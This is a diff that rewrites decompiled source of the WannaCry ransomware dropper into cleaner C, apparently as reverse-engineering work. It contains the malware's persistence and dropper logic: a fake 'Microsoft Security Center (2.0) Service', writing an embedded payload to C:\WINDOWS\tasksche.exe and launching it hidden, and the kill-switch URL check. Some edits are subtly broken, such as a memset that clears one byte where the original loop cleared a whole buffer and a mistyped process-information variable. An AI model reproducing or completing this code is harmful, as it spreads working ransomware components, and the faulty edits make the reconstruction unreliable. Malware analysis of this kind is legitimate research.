@@ -6691,15 +6691,12 @@ void create_wannacry_service() {
   char exec_with_args [260];
   
   // C:\Austin\Desktop\wannacry.exe -m security
-  sprintf(exec_with_args,s__s__m_security_00431330,&executable_path);
-  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
-  if (hSCManager != (SC_HANDLE)0x0) {
-    hService = CreateServiceA(hSCManager,s_mssecsvc2_0_004312fc,
-                              s_Microsoft_Security_Center__2_0__S_00431308,0xf01ff,0x10,2,1,
-                              exec_with_args,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
-                              (LPCSTR)0x0);
-    if (hService != (SC_HANDLE)0x0) {
-      StartServiceA(hService,0,(LPCSTR *)0x0);
+  sprintf(exec_with_args, "%s -m security", &executable_path);
+  hSCManager = OpenSCManagerA(NULL, NULL, 0xf003f);
+  if (hSCManager != NULL) {
+    hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 0x10, 2, 1, exec_with_args, NULL, NULL, NULL, NULL, NULL);
+    if (hService != NULL) {
+      StartServiceA(hService, 0, NULL);
       CloseServiceHandle(hService);
     }
     CloseServiceHandle(hSCManager);
@@ -6720,78 +6717,66 @@ undefined4 write_1831_to_taskche_exe(void) {
   uint uVar4;
   uint uVar5;
   undefined **ppuVar6;
-  LPSTR *ppCVar7;
+  char *ppCVar7;
   undefined **ppuVar8;
   char *pcVar9;
   char *pcVar10;
   undefined4 *puVar11;
   HANDLE hObject;
-  _PROCESS_INFORMATION res1831_locked;
+  LPVOID res1831_locked;
   _STARTUPINFOA _Stack592;
   char acStack524 [4];
-  CHAR taskche_path;
+  char taskche_path;
   undefined4 unkown_buffer_nulled [64];
-  CHAR qeriu_path;
+  char qeriu_path;
   undefined4 unkown_buffer2_nulled [64];
   
   //get handle to kernel32.dll
   hModule = GetModuleHandleW(u_kernel32_dll_004313b4);
-  if (hModule != (HMODULE)0x0) {
-    createProcessA = (CreateProcessA *)GetProcAddress(hModule,s_CreateProcessA_004313a4);
-    createFileA = (CreateFileA *)GetProcAddress(hModule,s_CreateFileA_00431398);
-    writeFile = (WriteFile *)GetProcAddress(hModule,s_WriteFile_0043138c);
-    closeHandle = (CloseHandle *)GetProcAddress(hModule,s_CloseHandle_00431380);
-    if ((((createProcessA != (CreateProcessA *)0x0) && (createFileA != (CreateFileA *)0x0)) &&
-        (writeFile != (WriteFile *)0x0)) && (closeHandle != (CloseHandle *)0x0)) {
-      res1831_info = FindResourceA((HMODULE)0x0,(LPCSTR)1831,&DAT_0043137c);
-      if (res1831_info != (HRSRC)0x0) {
-        res1831_handle = LoadResource((HMODULE)0x0,res1831_info);
-        if (res1831_handle != (HGLOBAL)0x0) {
+  if (hModule != NULL) {
+    createProcessA = (CreateProcessA *)GetProcAddress(hModule, "CreateProcessA");
+    createFileA = (CreateFileA *)GetProcAddress(hModule, "CreateFileA");
+    writeFile = (WriteFile *)GetProcAddress(hModule, "WriteFile");
+    closeHandle = (CloseHandle *)GetProcAddress(hModule, "CloseHandle");
+    if ((((createProcessA != NULL) && (createFileA != NULL)) &&
+        (writeFile != NULL)) && (closeHandle != NULL)) {
+      res1831_info = FindResourceA(NULL,(LPCSTR)1831,&DAT_0043137c);
+      if (res1831_info != NULL) {
+        res1831_handle = LoadResource(NULL,res1831_info);
+        if (res1831_handle != NULL) {
           res1831_locked.hProcess = LockResource(res1831_handle);
-          if (res1831_locked.hProcess != (LPVOID)0x0) {
-            res1831_size = SizeofResource((HMODULE)0x0,res1831_info);
+          if (res1831_locked.hProcess != NULL) {
+            res1831_size = SizeofResource(NULL, res1831_info);
             if (res1831_size != 0) {
               iVar3 = 0x40;
               taskche_path = '\0';
               puVar11 = &unkown_buffer_nulled;
               
-              //memset(puVar11, 0, 0x40/64);
+              memset(puVar11, 0, 0x40/64);
               
-              while (iVar3 != 0) {
-                iVar3 = iVar3 + -1;
-                *puVar11 = 0;
-                puVar11 = puVar11 + 1;
-              }
-
               *(undefined2 *)puVar11 = 0;
               *(undefined *)((int)puVar11 + 2) = 0;
               iVar3 = 0x40;
               qeriu_path = '\0';
               puVar11 = &unkown_buffer2_nulled;
 
-              // memset(puVar11, 0, 0x40/64);
-              
-              while (iVar3 != 0) {
-                iVar3 = iVar3 + -1;
-                *puVar11 = 0;
-                puVar11 = puVar11 + 1;
-              }
+              memset(puVar11, 0, 0x40/64);
 
               *(undefined2 *)puVar11 = 0;
               *(undefined *)((int)puVar11 + 2) = 0;
               
               // C:\WINDOWS\taskche.exe
-              sprintf(&taskche_path, s_C___s__s_00431358, s_WINDOWS_00431364, s_tasksche_exe_0043136c);
+              sprintf(&taskche_path, "C:\\%s\\%s", "WINDOWS", "tasksche.exe");
               
               // C:\Windows\qeriuwjhrf
-              sprintf(&qeriu_path, s_C___s_qeriuwjhrf_00431344, s_WINDOWS_00431364);
+              sprintf(&qeriu_path, "C:\\%s\\qeriuwjhrf", "WINDOWS");
               
               MoveFileExA(&taskche_path,&qeriu_path, 1);
-              createdFileHandle = (*createFileA)(&taskche_path, 0x40000000, 0, (LPSECURITY_ATTRIBUTES)0x0, 2, 4,(HANDLE)0x0);
+              createdFileHandle = (*createFileA)(&taskche_path, 0x40000000, 0, NULL, 2, 4,NULL);
               if (createdFileHandle != (HANDLE)0xffffffff) {
-                (*writeFile)(createdFileHandle, res1831_locked.hProcess, res1831_size, (LPDWORD)&res1831_locked, (LPOVERLAPPED)0x0);
+                (*writeFile)(createdFileHandle, res1831_locked.hProcess, res1831_size, (LPDWORD)&res1831_locked, NULL);
                 (*closeHandle)(createdFileHandle);
-                res1831_locked.hThread = (HANDLE)0x0;
+                res1831_locked.hThread = NULL;
                 res1831_locked.dwProcessId = 0;
                 res1831_locked.dwThreadId = 0;
                 iVar3 = 0x10;
@@ -6856,9 +6841,7 @@ undefined4 write_1831_to_taskche_exe(void) {
                 _Stack592.wShowWindow = 0;
                 _Stack592.dwFlags = 0x81;
                 
-                BVar2 = (*createProcessA)((LPCSTR)0x0, acStack524, (LPSECURITY_ATTRIBUTES)0x0,
-                                          (LPSECURITY_ATTRIBUTES)0x0, 0, 0x8000000, (LPVOID)0x0,
-                                          (LPCSTR)0x0, (LPSTARTUPINFOA)&_Stack592, (LPPROCESS_INFORMATION)&res1831_locked);
+                BVar2 = (*createProcessA)(NULL, acStack524, NULL, NULL, 0, 0x8000000, NULL, NULL, (LPSTARTUPINFOA)&_Stack592, (LPPROCESS_INFORMATION)&res1831_locked);
                 
                 if (BVar2 != 0) {
                   (*closeHandle)(hObject);
@@ -6908,7 +6891,7 @@ void wannacry_real_entry(void) {
   undefined4 uStack8;
   undefined4 uStack4;
   
-  GetModuleFileNameA((HMODULE)0x0, (LPSTR)&executable_path, 0x104);
+  GetModuleFileNameA(NULL, (LPSTR)&executable_path, 0x104);
   argc = (int *)__p___argc();
   
   if (*argc < 2) {
@@ -6916,18 +6899,17 @@ void wannacry_real_entry(void) {
     return;
   }
 
-  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
-  if (hSCManager != (SC_HANDLE)0x0) {
-    //s_mssecsvc2_0_004312fc = "mssecsvc2.0"
-    hSCObject = OpenServiceA(hSCManager,s_mssecsvc2_0_004312fc,0xf01ff);
-    if (hSCObject != (SC_HANDLE)0x0) {
+  hSCManager = OpenSCManagerA(NULL,NULL,0xf003f);
+  if (hSCManager != NULL) {
+    hSCObject = OpenServiceA(hSCManager,"mssecsvc2.0",0xf01ff);
+    if (hSCObject != unkown_buffer2_nulled) {
       FUN_00407fa0(hSCObject,0x3c);
       CloseServiceHandle(hSCObject);
     }
     CloseServiceHandle(hSCManager);
   }
 
-  SStack16.lpServiceName = s_mssecsvc2_0_004312fc;
+  SStack16.lpServiceName = "mssecsvc2.0";
   SStack16.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
   uStack8 = 0;
   uStack4 = 0;
@@ -6939,20 +6921,16 @@ void wannacry_real_entry(void) {
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
   HINTERNET hInternet;
   HINTERNET hinternet_return;
-  int i;
   char *killswitch_url;
   char *killswitch_url_copy;
   char killswitch_url_buffer [57];
   
-  i = 14;
-  //killswitch_url = s_http___www_iuqerfsodp9ifjaposdfj_004313d0;
   killswitch_url = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
 
   killswitch_url_copy = killswitch_url_buffer;
   
   strncpy(killswitch_url_copy, killswitch_url, 14);
   
-
   *killswitch_url_copy = *killswitch_url;
   InternetOpenA(NULL, 1, NULL, NULL, 0);
   hinternet_return = InternetOpenUrlA(hInternet, killswitch_url_buffer, NULL, 0, 0x84000000, 0);
